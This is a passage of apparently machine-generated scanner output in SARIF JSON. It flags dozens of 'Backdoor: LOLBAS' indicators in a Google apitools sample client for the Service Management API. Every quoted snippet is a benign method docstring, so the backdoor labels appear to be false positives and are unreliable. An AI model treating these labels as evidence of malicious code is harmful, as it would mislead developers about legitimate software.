                      "text": "\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\ncustomer's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\nOperation<response: CustomerSettings>\n",
                      "markdown": "`\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\ncustomer's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\nOperation<response: CustomerSettings>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 293,
                  "startColumn": 55,
                  "endLine": 293,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\ncustomer's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\n",
                    "rendered": {
                      "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\ncustomer's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\n",
                      "markdown": "`    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\ncustomer's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 37,
                  "endLine": 266,
                  "endColumn": 46,
                  "snippet": {
                    "text": "          }\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Retrieves the settings that control the specified customer's usage of the.\nservice.\n\n      Args:\n",
                    "rendered": {
                      "text": "          }\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Retrieves the settings that control the specified customer's usage of the.\nservice.\n\n      Args:\n",
                      "markdown": "`          }\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Retrieves the settings that control the specified customer's usage of the.\nservice.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 35,
                  "endLine": 62,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets the latest state of a long-running operation.  Clients can use this.\nmethod to poll the operation result at intervals as recommended by the API\nservice.\n\n      Args:\n",
                    "rendered": {
                      "text": "\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets the latest state of a long-running operation.  Clients can use this.\nmethod to poll the operation result at intervals as recommended by the API\nservice.\n\n      Args:\n",
                      "markdown": "`\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets the latest state of a long-running operation.  Clients can use this.\nmethod to poll the operation result at intervals as recommended by the API\nservice.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 798,
                  "startColumn": 45,
                  "endLine": 798,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    )\n\n    def UpdateConfig(self, request, global_params=None):\n      r\"\"\"Updates the specified subset of the service resource. Equivalent to.\ncalling `UpdateService` with only the `service_config` field updated.\n\nOperation<response: google.api.Service>\n",
                    "rendered": {
                      "text": "    )\n\n    def UpdateConfig(self, request, global_params=None):\n      r\"\"\"Updates the specified subset of the service resource. Equivalent to.\ncalling `UpdateService` with only the `service_config` field updated.\n\nOperation<response: google.api.Service>\n",
                      "markdown": "`    )\n\n    def UpdateConfig(self, request, global_params=None):\n      r\"\"\"Updates the specified subset of the service resource. Equivalent to.\ncalling `UpdateService` with only the `service_config` field updated.\n\nOperation<response: google.api.Service>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 742,
                  "startColumn": 67,
                  "endLine": 742,
                  "endColumn": 76,
                  "snippet": {
                    "text": "    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates the configuration of a service.  If the specified service does not.\nalready exist, then it is created.\n\nOperation<response: ManagedService>\n",
                    "rendered": {
                      "text": "    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates the configuration of a service.  If the specified service does not.\nalready exist, then it is created.\n\nOperation<response: ManagedService>\n",
                      "markdown": "`    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates the configuration of a service.  If the specified service does not.\nalready exist, then it is created.\n\nOperation<response: ManagedService>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 713,
                  "startColumn": 45,
                  "endLine": 713,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    )\n\n    def PatchConfig(self, request, global_params=None):\n      r\"\"\"Updates the specified subset of the service resource. Equivalent to.\ncalling `PatchService` with only the `service_config` field updated.\n\nOperation<response: google.api.Service>\n",
                    "rendered": {
                      "text": "    )\n\n    def PatchConfig(self, request, global_params=None):\n      r\"\"\"Updates the specified subset of the service resource. Equivalent to.\ncalling `PatchService` with only the `service_config` field updated.\n\nOperation<response: google.api.Service>\n",
                      "markdown": "`    )\n\n    def PatchConfig(self, request, global_params=None):\n      r\"\"\"Updates the specified subset of the service resource. Equivalent to.\ncalling `PatchService` with only the `service_config` field updated.\n\nOperation<response: google.api.Service>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 658,
                  "startColumn": 40,
                  "endLine": 658,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n    def List(self, request, global_params=None):\n      r\"\"\"Lists all managed services. If the `consumer_project_id` is specified,.\nthe project's settings for the specified service are also returned.\n\n      Args:\n        request: (ServicemanagementServicesListRequest) input message\n",
                    "rendered": {
                      "text": "\n    def List(self, request, global_params=None):\n      r\"\"\"Lists all managed services. If the `consumer_project_id` is specified,.\nthe project's settings for the specified service are also returned.\n\n      Args:\n        request: (ServicemanagementServicesListRequest) input message\n",
                      "markdown": "`\n    def List(self, request, global_params=None):\n      r\"\"\"Lists all managed services. If the `consumer_project_id` is specified,.\nthe project's settings for the specified service are also returned.\n\n      Args:\n        request: (ServicemanagementServicesListRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 631,
                  "startColumn": 25,
                  "endLine": 631,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n    def GetConfig(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n        request: (ServicemanagementServicesGetConfigRequest) input message\n",
                    "rendered": {
                      "text": "\n    def GetConfig(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n        request: (ServicemanagementServicesGetConfigRequest) input message\n",
                      "markdown": "`\n    def GetConfig(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n        request: (ServicemanagementServicesGetConfigRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 630,
                  "startColumn": 16,
                  "endLine": 630,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    )\n\n    def GetConfig(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n",
                    "rendered": {
                      "text": "    )\n\n    def GetConfig(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n",
                      "markdown": "`    )\n\n    def GetConfig(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 578,
                  "startColumn": 40,
                  "endLine": 578,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a managed service. If the `consumer_project_id` is specified,.\nthe project's settings for the specified service are also returned.\n\n      Args:\n        request: (ServicemanagementServicesGetRequest) input message\n",
                    "rendered": {
                      "text": "\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a managed service. If the `consumer_project_id` is specified,.\nthe project's settings for the specified service are also returned.\n\n      Args:\n        request: (ServicemanagementServicesGetRequest) input message\n",
                      "markdown": "`\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a managed service. If the `consumer_project_id` is specified,.\nthe project's settings for the specified service are also returned.\n\n      Args:\n        request: (ServicemanagementServicesGetRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 549,
                  "startColumn": 14,
                  "endLine": 549,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n    def Enable(self, request, global_params=None):\n      r\"\"\"Enable a managed service for a project with default setting.\nIf the managed service has dependencies, they will be enabled as well.\n\nOperation<response: EnableServiceResponse>\n\n",
                    "rendered": {
                      "text": "\n    def Enable(self, request, global_params=None):\n      r\"\"\"Enable a managed service for a project with default setting.\nIf the managed service has dependencies, they will be enabled as well.\n\nOperation<response: EnableServiceResponse>\n\n",
                      "markdown": "`\n    def Enable(self, request, global_params=None):\n      r\"\"\"Enable a managed service for a project with default setting.\nIf the managed service has dependencies, they will be enabled as well.\n\nOperation<response: EnableServiceResponse>\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 548,
                  "startColumn": 26,
                  "endLine": 548,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    )\n\n    def Enable(self, request, global_params=None):\n      r\"\"\"Enable a managed service for a project with default setting.\nIf the managed service has dependencies, they will be enabled as well.\n\nOperation<response: EnableServiceResponse>\n",
                    "rendered": {
                      "text": "    )\n\n    def Enable(self, request, global_params=None):\n      r\"\"\"Enable a managed service for a project with default setting.\nIf the managed service has dependencies, they will be enabled as well.\n\nOperation<response: EnableServiceResponse>\n",
                      "markdown": "`    )\n\n    def Enable(self, request, global_params=None):\n      r\"\"\"Enable a managed service for a project with default setting.\nIf the managed service has dependencies, they will be enabled as well.\n\nOperation<response: EnableServiceResponse>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 519,
                  "startColumn": 55,
                  "endLine": 519,
                  "endColumn": 64,
                  "snippet": {
                    "text": "\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\nOperation<response: DisableServiceResponse>\n",
                    "rendered": {
                      "text": "\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\nOperation<response: DisableServiceResponse>\n",
                      "markdown": "`\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\nOperation<response: DisableServiceResponse>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 519,
                  "startColumn": 6,
                  "endLine": 519,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\nOperation<response: DisableServiceResponse>\n",
                    "rendered": {
                      "text": "\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\nOperation<response: DisableServiceResponse>\n",
                      "markdown": "`\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\nOperation<response: DisableServiceResponse>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 518,
                  "startColumn": 27,
                  "endLine": 518,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    )\n\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\n",
                    "rendered": {
                      "text": "    )\n\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\n",
                      "markdown": "`    )\n\n    def Disable(self, request, global_params=None):\n      r\"\"\"Disable a managed service for a project.\nGoogle Service Management will only disable the managed service even if\nthere are other services depend on the managed service.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 227,
                  "startColumn": 47,
                  "endLine": 227,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\nbackend services.\n\nOperation<response: SubmitConfigSourceResponse>\n",
                    "rendered": {
                      "text": "      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\nbackend services.\n\nOperation<response: SubmitConfigSourceResponse>\n",
                      "markdown": "`      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\nbackend services.\n\nOperation<response: SubmitConfigSourceResponse>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 227,
                  "startColumn": 9,
                  "endLine": 227,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\nbackend services.\n\nOperation<response: SubmitConfigSourceResponse>\n",
                    "rendered": {
                      "text": "      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\nbackend services.\n\nOperation<response: SubmitConfigSourceResponse>\n",
                      "markdown": "`      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\nbackend services.\n\nOperation<response: SubmitConfigSourceResponse>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 62,
                  "endLine": 224,
                  "endColumn": 71,
                  "snippet": {
                    "text": "    )\n\n    def Submit(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\n",
                    "rendered": {
                      "text": "    )\n\n    def Submit(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\n",
                      "markdown": "`    )\n\n    def Submit(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 23,
                  "endLine": 224,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    )\n\n    def Submit(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\n",
                    "rendered": {
                      "text": "    )\n\n    def Submit(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\n",
                      "markdown": "`    )\n\n    def Submit(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service based on.\nuser-supplied configuration sources files (for example: OpenAPI\nSpecification). This method stores the source configurations as well as the\ngenerated service config. It does NOT apply the service config to any\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 34,
                  "endLine": 197,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    )\n\n    def List(self, request, global_params=None):\n      r\"\"\"Lists the history of the service config for a managed service,.\nfrom the newest to the oldest.\n\n      Args:\n",
                    "rendered": {
                      "text": "    )\n\n    def List(self, request, global_params=None):\n      r\"\"\"Lists the history of the service config for a managed service,.\nfrom the newest to the oldest.\n\n      Args:\n",
                      "markdown": "`    )\n\n    def List(self, request, global_params=None):\n      r\"\"\"Lists the history of the service config for a managed service,.\nfrom the newest to the oldest.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 25,
                  "endLine": 171,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n        request: (ServicemanagementServicesConfigsGetRequest) input message\n",
                    "rendered": {
                      "text": "\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n        request: (ServicemanagementServicesConfigsGetRequest) input message\n",
                      "markdown": "`\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n        request: (ServicemanagementServicesConfigsGetRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 16,
                  "endLine": 170,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    )\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n",
                    "rendered": {
                      "text": "    )\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n",
                      "markdown": "`    )\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Gets a service config (version) for a managed service. If `config_id` is.\nnot specified, the latest service config will be returned.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 54,
                  "endLine": 143,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n      Args:\n",
                    "rendered": {
                      "text": "\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n      Args:\n",
                      "markdown": "`\n    def Create(self, request, global_params=None):\n      r\"\"\"Creates a new service config (version) for a managed service. This method.\nonly stores the service config, but does not apply the service config to\nany backend services.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
